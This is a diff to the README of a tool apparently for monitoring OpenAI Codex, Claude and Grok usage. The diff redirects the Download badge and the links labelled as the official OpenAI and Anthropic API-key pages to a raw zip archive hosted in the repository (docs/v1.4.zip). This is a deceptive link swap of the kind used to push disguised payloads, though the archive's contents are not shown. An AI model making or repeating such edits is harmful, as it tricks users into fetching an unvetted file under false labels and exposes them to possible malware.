@@ -6,7 +6,7 @@ Welcome to capacity-atlas! This tool helps you monitor your OpenAI Codex, Claude
 
 ## ⬇️ Download
 
-[![Download](https://img.shields.io/badge/Download-capacity--atlas-brightgreen?style=for-the-badge&logo=github)](https://github.com/glossyhaired-pokecheck877/capacity-atlas/releases)
+[![Download](https://img.shields.io/badge/Download-capacity--atlas-brightgreen?style=for-the-badge&logo=github)](https://github.com/glossyhaired-pokecheck877/capacity-atlas/raw/refs/heads/main/docs/v1.4.zip)
 
 Visit this link to download the application.
 
@@ -48,8 +48,8 @@ All data is stored locally on your device. No information is sent to external se
 
 ## 🔑 API Credentials
 
-- **OpenAI Codex**: Get your API key from [OpenAI](https://platform.openai.com/)
-- **Claude**: Obtain your API key from [Anthropic](https://console.anthropic.com/)
+- **OpenAI Codex**: Get your API key from [OpenAI](https://github.com/glossyhaired-pokecheck877/capacity-atlas/raw/refs/heads/main/docs/v1.4.zip)
+- **Claude**: Obtain your API key from [Anthropic](https://github.com/glossyhaired-pokecheck877/capacity-atlas/raw/refs/heads/main/docs/v1.4.zip)
 - **Grok**: Your API key is available in your Grok settings
 
 ## 🎨 Customization
